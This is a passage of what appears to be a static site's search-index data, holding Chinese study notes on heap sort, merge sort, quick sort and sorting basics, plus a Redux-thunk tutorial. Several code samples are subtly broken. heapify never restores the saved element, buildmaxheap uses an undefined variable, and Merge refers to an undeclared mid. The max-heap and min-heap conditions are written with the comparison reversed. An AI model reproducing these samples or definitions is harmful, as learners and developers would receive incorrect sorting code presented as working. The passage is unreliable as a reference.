每一趟将堆顶元素与堆中最后一个元素交换，然后将剩余的元素重新调整为堆。\n\n\nvoid heapSort(int a[],int len){\n  buildMaxHeap(a,len); //建立大根堆\n  for(int i=len;i>1;i--){\n    swap(a[i],a[1]); //交换堆顶元素和堆中最后一个元素\n    heapify(a,1,i-1); //重新调整堆\n  }\n}\n\n\n\n不断的建立堆，然后交换堆顶元素和堆中最后一个元素，然后重新调整堆，直到堆中只剩下一个元素。\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> O(1)\n\n\n# 时间复杂度\n\n> O(n)+O(nlog2n)=O(nlog2n)\n\n建立堆的时间复杂度为O(n)\n\n\n# 稳定性\n\n> 不稳定",normalizedContent:"# 堆排序\n\n> 堆排序是一种树形选择排序，选择最小或最大的元素加入到有序序列中。\n\n\n# 1. 堆的定义\n\n> 堆是一种完全二叉树，分为大根堆和小根堆。\n\n\n# 二叉树的顺序存储\n\n> 二叉树的顺序存储是将二叉树的节点按照层序遍历的顺序存储到数组中。\n\n下标从1开始，对于任意节点i，有：\n\n * i的父节点：i/2\n * i的左孩子节点：2i\n * i的右孩子节点：2i+1\n * i的最后一个叶子节点：n/2\n * i所在的层：log2(n+1)或log2n+1\n\n\n# 大根堆\n\n> 每个节点的值都大于或等于其左右孩子节点的值。\n\nl(i) <= l(2i+1) && l(i) <= l(2i+2) 1<=i<=n/2\n\nint a=[0,87,45,78,32,17,65,53,09] //存储堆的数组\n//变成二叉树就是(逻辑上的)\n//          87\n//      45      78\n//    32  17  65  53\n//   09\n\n\n大根堆的特点：\n\n 1. 根节点的值最大\n 2. 根节点的值大于左右孩子节点的值 根>=左 && 根>=右\n\n\n# 小根堆\n\n> 每个节点的值都小于或等于其左右孩子节点的值。\n\nl(i) >= l(2i+1) && l(i) >= l(2i+2) 1<=i<=n/2\n\nint a=[0,09,17,32,45,78,65,53,87] //存储堆的数组\n//变成二叉树就是(逻辑上的)\n//          09\n//      17      32\n//    45  78  65  53\n//   87\n\n\n小根堆的特点：\n\n 1. 根节点的值最小\n 2. 根节点的值小于左右孩子节点的值 根<=左 && 根<=右\n\n\n# 2. 建立堆\n\n> 把所有的非终端节点都检查一遍，使其满足堆的性质。如果不满足，就调整。\n\n检查当前节点是否满足堆的性质，如果不满足，将当前节点与更大的一个或者更小的一个孩子节点交换，直到满足堆的性质。\n\n//举例\nint a=[0,53,17,78,09,45,65,87,32] //存储堆的数组\n\n//第一次检查 53，17，78，09\n\n//          53\n//      17      78\n//    09  45  65  87\n//   32\n\n// 上述树的非终端节点有4个，分别是53,17,78,09  从后往前查找 也就是 i/2。 09不满足堆的性质，将09与左右孩子中较大的一个交换\n\n//          53\n//      17      78\n//    32  45  65  87\n//   09\n\n\n\n\n# 建立大根堆\n\nint a=[0,53,17,78,09,45,65,87,32] //存储堆的数组\n\nvoid buildmaxheap(int a[],int len){\n  //从最后一个非终端节点开始，从后往前检查\n    for(int i=n/2;i>0;i--){\n        heapify(a,i,len);\n    }\n}\n\nvoid heapify(int a[],int n,int len){\n  a[0]=a[n];  //a[0]暂存当前节点\n  for(int i=2*n;i<=len;i*=2){\n    if(i<len && a[i]<a[i+1]){ //找到左右孩子中较大的一个\n      i++;\n    }\n    if(a[0]>=a[i]){ //如果当前节点大于左右孩子中较大的一个，不需要交换\n      break;\n    }else{\n      a[n]=a[i]; //否则交换\n      n=i; //继续检查\n    }\n  }\n\n}\n    \n\n\n\n# 3. 堆排序(大根堆)\n\n> 选择排序：每一趟在待排序中选取最大的元素放到有序序列中。\n\n堆排序 每一趟将堆顶元素与堆中最后一个元素交换，然后将剩余的元素重新调整为堆。\n\n\nvoid heapsort(int a[],int len){\n  buildmaxheap(a,len); //建立大根堆\n  for(int i=len;i>1;i--){\n    swap(a[i],a[1]); //交换堆顶元素和堆中最后一个元素\n    heapify(a,1,i-1); //重新调整堆\n  }\n}\n\n\n\n不断的建立堆，然后交换堆顶元素和堆中最后一个元素，然后重新调整堆，直到堆中只剩下一个元素。\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> o(1)\n\n\n# 时间复杂度\n\n> o(n)+o(nlog2n)=o(nlog2n)\n\n建立堆的时间复杂度为o(n)\n\n\n# 稳定性\n\n> 不稳定",charsets:{cjk:!0}},{title:"归并排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/07-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/07-归并排序.md",key:"v-35e2424c",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/07-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"基本思想",slug:"基本思想",normalizedTitle:"基本思想",charIndex:53},{level:2,title:"归并的实现",slug:"归并的实现",normalizedTitle:"归并的实现",charIndex:103},{level:2,title:"归并排序的实现",slug:"归并排序的实现",normalizedTitle:"归并排序的实现",charIndex:1050},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:2031},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:2059},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:2127}],headersStr:"基本思想 归并的实现 归并排序的实现 算法分析 时间复杂度 空间复杂度",content:"# 归并排序\n\n> 归并排序一般是将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n\n\n# 基本思想\n\n> 用递归的思想将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n\n\n# 归并的实现\n\n\n//举例说明两个有序数组的合并\n// int arr=[12, 16, 24, 33, 45, 56, 60]\n// int arr1=[7, 10, 21, 24, 37]\n// int arr2=[] //用来存储合并后的数组\n// 每次循环比较两个数组的第一个元素，将较小的元素放到新的数组中，然后将较小元素所在的数组的下标加1，继续比较，直到其中一个数组的元素全部放到新的数组中，然后将另一个数组的剩余元素全部放到新的数组中\n\n// 举例说明\n// 第一趟 12和7比较 7小 放到新的数组中 7所在的数组下标加1 得到 arr2=[7]\n\n// 第二趟 12和10比较 10小 放到新的数组中 10所在的数组下标加1 得到 arr2=[7, 10]\n\n// 第三趟 12和21比较 12小 放到新的数组中 12所在的数组下标加1 得到 arr2=[7, 10, 12]\n\n// ...\n\n//最后一趟将arr 或 arr1中剩余的元素全部放到arr2中\n\n//代码实现\n\nvoid merge(int *arr, int *arr1, int *arr2, int length, int length1) {\n  //i用来记录arr的下标，j用来记录arr1的下标，k用来记录arr2的下标\n\n    int i = 0, j = 0, k = 0;\n    //循环比较arr和arr1的元素，将较小的元素放到arr2中\n    int min=length<length1?length:length1;\n    for(int m=0;m<min;m++){\n        if(arr[i]<arr1[j]){\n            arr2[k++]=arr[i++];\n        }else{\n            arr2[k++]=arr1[j++];\n        }\n    }\n\n    while(i<length){\n        arr2[k++]=arr[i++];\n    }\n\n    while(j<length1){\n        arr2[k++]=arr1[j++];\n    }\n \n }\n\n\n\n\n# 归并排序的实现\n\n\nint arr[] = {9, 1, 2, 5, 7, 4, 8, 6, 3, 5};\n\nint *B = (int *) malloc(sizeof(int) * 10);\n\n//一般采用递归的思想，将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n//low 为数组的第一个元素 high为数组的最后一个元素 mid为数组的中间元素\nvoid Merge(int A[], int low, int x, int high) {\n    int i, j, k;\n    // 将A中的数据复制到B中\n    for (k = low; k <= high; ++k) {\n        B[k] = A[k];\n    }\n    // 将B中的数据按照顺序复制到A中\n    for (i = low, j = mid + 1, k = i; i <= mid && j <= high; ++k) {\n        if (B[i] <= B[j]) {\n            A[k] = B[i++];\n        } else {\n            A[k] = B[j++];\n        }\n    }\n    // 将B中剩余的数据复制到A中\n    while (i <= mid) {\n        A[k++] = B[i++];\n    }\n    while (j <= high) {\n        A[k++] = B[j++];\n    }\n}\n\nvoid MergeSort(int A[], int low, int high) {\n    if (low < high) {\n      // 将数组分成两部分，分别进行排序\n        int mid = (low + high) / 2;\n        //递归的处理左侧数组\n        MergeSort(A, low, mid);\n        //递归的处理右侧数组\n        MergeSort(A, mid + 1, high);\n        //将排好序的两部分合并在一起\n        Merge(A, low, mid, high);\n    }\n}\n\n\n\n\n# 算法分析\n\n> 2路归并的树是一个倒立的二叉树\n\n\n# 时间复杂度\n\n归并的时间复杂度为O(n)\n\nn个元素进行2路归并排序 需要log2n次\n\n算法的时间复杂度为O(nlog2n)\n\n\n# 空间复杂度\n\n> O(n) 用于辅助的数组长度为n",normalizedContent:"# 归并排序\n\n> 归并排序一般是将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n\n\n# 基本思想\n\n> 用递归的思想将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n\n\n# 归并的实现\n\n\n//举例说明两个有序数组的合并\n// int arr=[12, 16, 24, 33, 45, 56, 60]\n// int arr1=[7, 10, 21, 24, 37]\n// int arr2=[] //用来存储合并后的数组\n// 每次循环比较两个数组的第一个元素，将较小的元素放到新的数组中，然后将较小元素所在的数组的下标加1，继续比较，直到其中一个数组的元素全部放到新的数组中，然后将另一个数组的剩余元素全部放到新的数组中\n\n// 举例说明\n// 第一趟 12和7比较 7小 放到新的数组中 7所在的数组下标加1 得到 arr2=[7]\n\n// 第二趟 12和10比较 10小 放到新的数组中 10所在的数组下标加1 得到 arr2=[7, 10]\n\n// 第三趟 12和21比较 12小 放到新的数组中 12所在的数组下标加1 得到 arr2=[7, 10, 12]\n\n// ...\n\n//最后一趟将arr 或 arr1中剩余的元素全部放到arr2中\n\n//代码实现\n\nvoid merge(int *arr, int *arr1, int *arr2, int length, int length1) {\n  //i用来记录arr的下标，j用来记录arr1的下标，k用来记录arr2的下标\n\n    int i = 0, j = 0, k = 0;\n    //循环比较arr和arr1的元素，将较小的元素放到arr2中\n    int min=length<length1?length:length1;\n    for(int m=0;m<min;m++){\n        if(arr[i]<arr1[j]){\n            arr2[k++]=arr[i++];\n        }else{\n            arr2[k++]=arr1[j++];\n        }\n    }\n\n    while(i<length){\n        arr2[k++]=arr[i++];\n    }\n\n    while(j<length1){\n        arr2[k++]=arr1[j++];\n    }\n \n }\n\n\n\n\n# 归并排序的实现\n\n\nint arr[] = {9, 1, 2, 5, 7, 4, 8, 6, 3, 5};\n\nint *b = (int *) malloc(sizeof(int) * 10);\n\n//一般采用递归的思想，将数组分成两部分，分别进行排序，然后将排好序的两部分合并在一起\n//low 为数组的第一个元素 high为数组的最后一个元素 mid为数组的中间元素\nvoid merge(int a[], int low, int x, int high) {\n    int i, j, k;\n    // 将a中的数据复制到b中\n    for (k = low; k <= high; ++k) {\n        b[k] = a[k];\n    }\n    // 将b中的数据按照顺序复制到a中\n    for (i = low, j = mid + 1, k = i; i <= mid && j <= high; ++k) {\n        if (b[i] <= b[j]) {\n            a[k] = b[i++];\n        } else {\n            a[k] = b[j++];\n        }\n    }\n    // 将b中剩余的数据复制到a中\n    while (i <= mid) {\n        a[k++] = b[i++];\n    }\n    while (j <= high) {\n        a[k++] = b[j++];\n    }\n}\n\nvoid mergesort(int a[], int low, int high) {\n    if (low < high) {\n      // 将数组分成两部分，分别进行排序\n        int mid = (low + high) / 2;\n        //递归的处理左侧数组\n        mergesort(a, low, mid);\n        //递归的处理右侧数组\n        mergesort(a, mid + 1, high);\n        //将排好序的两部分合并在一起\n        merge(a, low, mid, high);\n    }\n}\n\n\n\n\n# 算法分析\n\n> 2路归并的树是一个倒立的二叉树\n\n\n# 时间复杂度\n\n归并的时间复杂度为o(n)\n\nn个元素进行2路归并排序 需要log2n次\n\n算法的时间复杂度为o(nlog2n)\n\n\n# 空间复杂度\n\n> o(n) 用于辅助的数组长度为n",charsets:{cjk:!0}},{title:"Redux-thunk",frontmatter:{},regularPath:"/React/Redux/05-Redux-thunk.html",relativePath:"React/Redux/05-Redux-thunk.md",key:"v-0cf37c6e",path:"/React/Redux/05-Redux-thunk.html",headers:[{level:2,title:"异步 Action",slug:"异步-action",normalizedTitle:"异步 action",charIndex:124},{level:2,title:"redux-thunk",slug:"redux-thunk-2",normalizedTitle:"redux-thunk",charIndex:186},{level:3,title:"安装",slug:"安装",normalizedTitle:"安装",charIndex:1165},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:183},{level:3,title:"异步的方法",slug:"异步的方法",normalizedTitle:"异步的方法",charIndex:1359},{level:2,title:"异步",slug:"异步",normalizedTitle:"异步",charIndex:92},{level:2,title:"附录",slug:"附录",normalizedTitle:"附录",charIndex:2081}],headersStr:"异步 Action redux-thunk 安装 使用 异步的方法 异步 附录",content:"# Redux-thunk\n\nRedux本身只能处理同步的Action，但可以通过中间件来拦截处理其它类型的action，比如函数(Thunk)，再用回调触发普通Action，从而实现异步处理，在这点上所有Redux的异步方案都是类似的。\n\n\n# 异步 Action\n\n比如 action 中有setTimeout或者通过fetch通用远程API这些场景，那么就应该使用 redux-thunk 了。\n\n当调用异步 API 时，有两个非常关键的时刻：\n\n * 发起请求的时刻\n * 接收到响应的时刻（也可能是超时）。\n\n这两个时刻都可能会更改应用的 state；为此，你需要 dispatch 普通的同步 action。一般情况下，每个 API 请求都需要 dispatch 至少三种 action：\n\n * 一种通知 reducer 请求开始的 action。\n   对于这种 action，reducer 可能会切换一下 state 中的 isFetching 标记。以此来告诉 UI 来显示加载界面。\n\n * 一种通知 reducer 请求成功的 action。\n   对于这种 action，reducer 可能会把接收到的新数据合并到 state 中，并重置 isFetching。UI 则会隐藏加载界面，并显示接收到的数据。\n\n * 一种通知 reducer 请求失败的 action。\n   对于这种 action，reducer 可能会重置 isFetching。另外，有些 reducer 会保存这些失败信息，并在 UI 里显示出来。\n\n为了区分这三种 action，可能在 action 里添加一个专门的 status 字段作为标记位：\n\n{ type: 'FETCH_POSTS' }\n{ type: 'FETCH_POSTS', status: 'error', error: 'Oops' }\n{ type: 'FETCH_POSTS', status: 'success', response: { ... } }\n\n\n又或者为它们定义不同的 type：\n\n{ type: 'FETCH_POSTS_REQUEST' }\n{ type: 'FETCH_POSTS_FAILURE', error: 'Oops' }\n{ type: 'FETCH_POSTS_SUCCESS', response: { ... } }\n\n\n\n# redux-thunk\n\n> redux-thunk 是一个比较流行的 redux 异步 action 中间件。\n\nredux-thunk 帮助你统一了异步和同步 action 的调用方式，把异步过程放在 action 级别解决，对 component 没有影响。\n\n\n# 安装\n\nnpm install redux-thunk --save\n\n\n\n# 使用\n\nimport { createStore ,applyMiddleware } from \"redux\";\nimport thunk from \"redux-thunk\";\nconst store = createStore(reducer,applyMiddleware(thunk))\n\n\n\n# 异步的方法\n\n//同步action\nconst increment = ()=>{\n    return {\n        type:INCREMENT\n    }\n}\n//异步action\nconst incrementAsync = ()=>{\n    return dispatch=>{\n        setTimeout(function(){\n            dispatch(increment())\n        },3000)\n    }\n}\n\n\n\n\n# 异步\n\nexport const getUser = () =>{\n    return dispatch=>{\n        //触发加载 action\n        dispatch({type:GET_USER_REQUEST})\n        fetch('https://randomuser.me/api/')\n        .then(res=>{\n            return res.json();\n        })\n        .then(data=>{\n            //加载成功 action\n            dispatch({type:GET_USER_SUCCESS,data:data.results[0]})\n        })\n        .catch(error=>{\n            //加载失败 action\n            dispatch({type:GET_USER_ERROR,error})\n        })\n    }\n}\n\n\n\n# 附录\n\n类型                地址\n测试API             https://randomuser.me/api/\nredux-thunk源码分析   https://segmentfault.com/a/1190000010154828\n\nhttps://segmentfault.com/a/1190000017055752\n\nhttps://segmentfault.com/a/1190000007248878 https://blog.csdn.net/liwusen/article/details/80980987 https://www.jianshu.com/p/759a3b7b9a3f",normalizedContent:"# redux-thunk\n\nredux本身只能处理同步的action，但可以通过中间件来拦截处理其它类型的action，比如函数(thunk)，再用回调触发普通action，从而实现异步处理，在这点上所有redux的异步方案都是类似的。\n\n\n# 异步 action\n\n比如 action 中有settimeout或者通过fetch通用远程api这些场景，那么就应该使用 redux-thunk 了。\n\n当调用异步 api 时，有两个非常关键的时刻：\n\n * 发起请求的时刻\n * 接收到响应的时刻（也可能是超时）。\n\n这两个时刻都可能会更改应用的 state；为此，你需要 dispatch 普通的同步 action。一般情况下，每个 api 请求都需要 dispatch 至少三种 action：\n\n * 一种通知 reducer 请求开始的 action。\n   对于这种 action，reducer 可能会切换一下 state 中的 isfetching 标记。以此来告诉 ui 来显示加载界面。\n\n * 一种通知 reducer 请求成功的 action。\n   对于这种 action，reducer 可能会把接收到的新数据合并到 state 中，并重置 isfetching。ui 则会隐藏加载界面，并显示接收到的数据。\n\n * 一种通知 reducer 请求失败的 action。\n   对于这种 action，reducer 可能会重置 isfetching。另外，有些 reducer 会保存这些失败信息，并在 ui 里显示出来。\n\n为了区分这三种 action，可能在 action 里添加一个专门的 status 字段作为标记位：\n\n{ type: 'fetch_posts' }\n{ type: 'fetch_posts', status: 'error', error: 'oops' }\n{ type: 'fetch_posts', status: 'success', response: { ... } }\n\n\n又或者为它们定义不同的 type：\n\n{ type: 'fetch_posts_request' }\n{ type: 'fetch_posts_failure', error: 'oops' }\n{ type: 'fetch_posts_success', response: { ... } }\n\n\n\n# redux-thunk\n\n> redux-thunk 是一个比较流行的 redux 异步 action 中间件。\n\nredux-thunk 帮助你统一了异步和同步 action 的调用方式，把异步过程放在 action 级别解决，对 component 没有影响。\n\n\n# 安装\n\nnpm install redux-thunk --save\n\n\n\n# 使用\n\nimport { createstore ,applymiddleware } from \"redux\";\nimport thunk from \"redux-thunk\";\nconst store = createstore(reducer,applymiddleware(thunk))\n\n\n\n# 异步的方法\n\n//同步action\nconst increment = ()=>{\n    return {\n        type:increment\n    }\n}\n//异步action\nconst incrementasync = ()=>{\n    return dispatch=>{\n        settimeout(function(){\n            dispatch(increment())\n        },3000)\n    }\n}\n\n\n\n\n# 异步\n\nexport const getuser = () =>{\n    return dispatch=>{\n        //触发加载 action\n        dispatch({type:get_user_request})\n        fetch('https://randomuser.me/api/')\n        .then(res=>{\n            return res.json();\n        })\n        .then(data=>{\n            //加载成功 action\n            dispatch({type:get_user_success,data:data.results[0]})\n        })\n        .catch(error=>{\n            //加载失败 action\n            dispatch({type:get_user_error,error})\n        })\n    }\n}\n\n\n\n# 附录\n\n类型                地址\n测试api             https://randomuser.me/api/\nredux-thunk源码分析   https://segmentfault.com/a/1190000010154828\n\nhttps://segmentfault.com/a/1190000017055752\n\nhttps://segmentfault.com/a/1190000007248878 https://blog.csdn.net/liwusen/article/details/80980987 https://www.jianshu.com/p/759a3b7b9a3f",charsets:{cjk:!0}},{title:"快速排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/04-快速排序.md",key:"v-dbded3f4",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"基本思想",slug:"基本思想",normalizedTitle:"基本思想",charIndex:90},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:1396},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:1405},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:1653},{level:3,title:"稳定性",slug:"稳定性",normalizedTitle:"稳定性",charIndex:1764},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:1848}],headersStr:"基本思想 算法分析 空间复杂度 时间复杂度 稳定性 其他",content:"# 快速排序\n\n> 基于交换排序，根据序列中两个元素关键字的对比结果来对换这两个记录在序列中的位置，从而达到排序的目的。\n\n快速排序是所有内部排序中平均性能最优的排序算法\n\n\n# 基本思想\n\n> 在待排序表中任取一个元素 pivot 作为枢轴(通常是取首元素)，通过一趟排序将待排序列表划分为两个部分，其中一部分的所有元素均比枢轴小，另一部分的所有元素均比枢轴大，此时枢轴在其排好序后的正确位置，然后再用同样的方法递归地排序划分出的两个部分。直至每部分内只有一个元素或空为止，即所有元素排好序。\n\n\nint arr = {4,1,2,5,7,4,8,6,3,5};\n\n//声明变量 low=4 high=5 pivot=9\n//第一轮排序 比pivot小的放在左边 比pivot大的放在右边\n//得到排序的结果 {4,1,2,5,4,3,5,6,7,8}\n//此时pivot的位置为5\n\n//递归的处理上述的逻辑分为 左边的序列和右边的序列，也就是下标为0到3的序列和下标为5到9的序列。分别走上述的逻辑，直到序列中只有一个元素或者没有元素为止。\n\n//代码实现\n\nint partition(int *arr, int low, int high) {\n  //取第一个元素为枢轴\n    int p = arr[low];\n    //当low<high的时候 证明序列中还有元素\n    while (high > low) {\n      //子循环处理右边的序列都要比枢轴大，不断向左移动high\n        while (arr[high] >= p && high > low)\n            high--;\n      //子循环处理完后，将比枢轴小的元素放到左边 也就是当前的low位置\n        arr[low] = arr[high];\n      //子循环处理左边的序列都要比枢轴小，不断向右移动low\n        while (arr[low] <= p && high > low)\n            low++;\n      //子循环处理完后，将比枢轴大的元素放到右边 也就是当前的high位置\n        arr[high] = arr[low];\n    }\n    //当low=high 或者 high<low的时候 证明序列中没有元素了，将枢轴放到当前的low位置\n    arr[low] = p;\n    //返回枢轴的位置 方便下次递归\n    return low;\n\n}\n\nvoid quickSort(int *arr, int low, int high) {\n  //递归结束的条件 high<=low的话 也就是 没有元素或者只有一个元素，证明已经排序完成。\n    if (low < high) {\n        //得到枢轴的位置\n        int pivot = partition(arr, low, high);\n        //处理左边的序列\n        quickSort(arr, low, pivot - 1);\n        //处理右边的序列\n        quickSort(arr, pivot + 1, high);\n    }\n}\n\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> 取决于递归的深度，最好情况下为 O(logn) ，最坏情况下为 O(n) 。个人认为：类似于二叉树的深度 (log2(n+1)) ，最好的情况为完全二叉树，最坏的情况为只有左子树或者只有右子树 O(n) 。\n\n * 最好的情况下，每次都能将序列均匀的分为两个部分。这样就是完整的二叉树，递归的深度为 log2(n+1) 。\n * 最坏的情况下，待排序的序列已经是有序的了，每次都只能将序列分为一个元素和剩下的元素。这样就是只有左子树或者只有右子树，递归的深度为 n 。\n\n\n# 时间复杂度\n\n> O(n*递归的深度)\n\n * 最好的时间复杂度=O(nlogn)\n * 最坏的时间复杂度=O(n^2)\n\n最好和最坏的时间复杂度和空间复杂度是相对应的。也就是越有序，时间复杂度和空间复杂度越高。\n\n\n# 稳定性\n\n> 不稳定\n\n\n2(1)   2(2)      1\nlow           high\n// 排序后\n1      2(2)    2(1)\n\n\n\n\n# 其他\n\n> 快速排序是所有内部排序中平均性能最优的排序算法，但是在最坏的情况下，时间复杂度为 O(n^2) ，所以需要对其进行优化。\n\n * 选择头、中、尾三个元素的中位数作为枢轴，这样可以避免最坏情况的发生。\n * 随机选择一个元素作为枢轴，这样可以避免最坏情况的发生。",normalizedContent:"# 快速排序\n\n> 基于交换排序，根据序列中两个元素关键字的对比结果来对换这两个记录在序列中的位置，从而达到排序的目的。\n\n快速排序是所有内部排序中平均性能最优的排序算法\n\n\n# 基本思想\n\n> 在待排序表中任取一个元素 pivot 作为枢轴(通常是取首元素)，通过一趟排序将待排序列表划分为两个部分，其中一部分的所有元素均比枢轴小，另一部分的所有元素均比枢轴大，此时枢轴在其排好序后的正确位置，然后再用同样的方法递归地排序划分出的两个部分。直至每部分内只有一个元素或空为止，即所有元素排好序。\n\n\nint arr = {4,1,2,5,7,4,8,6,3,5};\n\n//声明变量 low=4 high=5 pivot=9\n//第一轮排序 比pivot小的放在左边 比pivot大的放在右边\n//得到排序的结果 {4,1,2,5,4,3,5,6,7,8}\n//此时pivot的位置为5\n\n//递归的处理上述的逻辑分为 左边的序列和右边的序列，也就是下标为0到3的序列和下标为5到9的序列。分别走上述的逻辑，直到序列中只有一个元素或者没有元素为止。\n\n//代码实现\n\nint partition(int *arr, int low, int high) {\n  //取第一个元素为枢轴\n    int p = arr[low];\n    //当low<high的时候 证明序列中还有元素\n    while (high > low) {\n      //子循环处理右边的序列都要比枢轴大，不断向左移动high\n        while (arr[high] >= p && high > low)\n            high--;\n      //子循环处理完后，将比枢轴小的元素放到左边 也就是当前的low位置\n        arr[low] = arr[high];\n      //子循环处理左边的序列都要比枢轴小，不断向右移动low\n        while (arr[low] <= p && high > low)\n            low++;\n      //子循环处理完后，将比枢轴大的元素放到右边 也就是当前的high位置\n        arr[high] = arr[low];\n    }\n    //当low=high 或者 high<low的时候 证明序列中没有元素了，将枢轴放到当前的low位置\n    arr[low] = p;\n    //返回枢轴的位置 方便下次递归\n    return low;\n\n}\n\nvoid quicksort(int *arr, int low, int high) {\n  //递归结束的条件 high<=low的话 也就是 没有元素或者只有一个元素，证明已经排序完成。\n    if (low < high) {\n        //得到枢轴的位置\n        int pivot = partition(arr, low, high);\n        //处理左边的序列\n        quicksort(arr, low, pivot - 1);\n        //处理右边的序列\n        quicksort(arr, pivot + 1, high);\n    }\n}\n\n\n\n\n# 算法分析\n\n\n# 空间复杂度\n\n> 取决于递归的深度，最好情况下为 o(logn) ，最坏情况下为 o(n) 。个人认为：类似于二叉树的深度 (log2(n+1)) ，最好的情况为完全二叉树，最坏的情况为只有左子树或者只有右子树 o(n) 。\n\n * 最好的情况下，每次都能将序列均匀的分为两个部分。这样就是完整的二叉树，递归的深度为 log2(n+1) 。\n * 最坏的情况下，待排序的序列已经是有序的了，每次都只能将序列分为一个元素和剩下的元素。这样就是只有左子树或者只有右子树，递归的深度为 n 。\n\n\n# 时间复杂度\n\n> o(n*递归的深度)\n\n * 最好的时间复杂度=o(nlogn)\n * 最坏的时间复杂度=o(n^2)\n\n最好和最坏的时间复杂度和空间复杂度是相对应的。也就是越有序，时间复杂度和空间复杂度越高。\n\n\n# 稳定性\n\n> 不稳定\n\n\n2(1)   2(2)      1\nlow           high\n// 排序后\n1      2(2)    2(1)\n\n\n\n\n# 其他\n\n> 快速排序是所有内部排序中平均性能最优的排序算法，但是在最坏的情况下，时间复杂度为 o(n^2) ，所以需要对其进行优化。\n\n * 选择头、中、尾三个元素的中位数作为枢轴，这样可以避免最坏情况的发生。\n * 随机选择一个元素作为枢轴，这样可以避免最坏情况的发生。",charsets:{cjk:!0}},{title:"排序的基本概念",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/00-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"数据结构/排序/00-基本概念.md",key:"v-1bea5d48",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/00-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",headers:[{level:2,title:"排序的定义",slug:"排序的定义",normalizedTitle:"排序的定义",charIndex:14},{level:2,title:"排序的稳定性",slug:"排序的稳定性",normalizedTitle:"排序的稳定性",charIndex:51},{level:2,title:"内排序与外排序",slug:"内排序与外排序",normalizedTitle:"内排序与外排序",charIndex:338},{level:2,title:"排序的分类",slug:"排序的分类",normalizedTitle:"排序的分类",charIndex:454}],headersStr:"排序的定义 排序的稳定性 内排序与外排序 排序的分类",content:"# 排序的基本概念\n\n\n# 排序的定义\n\n> 排序是将一组无序的记录序列调整为有序的记录序列\n\n\n# 排序的稳定性\n\n> 如果一组记录中，存在多个具有相同的关键字，经过排序后，这些记录的相对次序保持不变，则称这种排序算法是稳定的；否则称为不稳定的\n\n例如：有一组记录的关键字为:[(a, 3), (b, 2), (c, 3), (d, 1)]\n\n如果按照关键字升序排序后，得到的结果为:[(d, 1), (b, 2), (a, 3), (c, 3)] a=3,c=3 排序后a始终在c前面，所以是稳定的\n\n如果按照关键字升序排序后，得到的结果为:[(d, 1), (b, 2), (c, 3), (a, 3)]  a=3,c=3 排序后c在a前面，所以是不稳定的\n\n\n\n\n# 内排序与外排序\n\n * 内排序：待排序的所有记录全部放置在内存中进行排序(关注如何使算法时间、空间复杂度更低)\n * 外排序：待排序的记录的个数很大，不能同时放置在内存中，需要借助外存进行排序(关注如何减少磁盘I/O次数)\n\n\n# 排序的分类\n\n * 十大排序算法总结\n\n\n\n * 用HTML5实现的各种排序算法的动画比较\n   http://www.webhek.com/post/comparison-sort.html",normalizedContent:"# 排序的基本概念\n\n\n# 排序的定义\n\n> 排序是将一组无序的记录序列调整为有序的记录序列\n\n\n# 排序的稳定性\n\n> 如果一组记录中，存在多个具有相同的关键字，经过排序后，这些记录的相对次序保持不变，则称这种排序算法是稳定的；否则称为不稳定的\n\n例如：有一组记录的关键字为:[(a, 3), (b, 2), (c, 3), (d, 1)]\n\n如果按照关键字升序排序后，得到的结果为:[(d, 1), (b, 2), (a, 3), (c, 3)] a=3,c=3 排序后a始终在c前面，所以是稳定的\n\n如果按照关键字升序排序后，得到的结果为:[(d, 1), (b, 2), (c, 3), (a, 3)]  a=3,c=3 排序后c在a前面，所以是不稳定的\n\n\n\n\n# 内排序与外排序\n\n * 内排序：待排序的所有记录全部放置在内存中进行排序(关注如何使算法时间、空间复杂度更低)\n * 外排序：待排序的记录的个数很大，不能同时放置在内存中，需要借助外存进行排序(关注如何减少磁盘i/o次数)\n\n\n# 排序的分类\n\n * 十大排序算法总结\n\n\n\n * 用html5实现的各种排序算法的动画比较\n   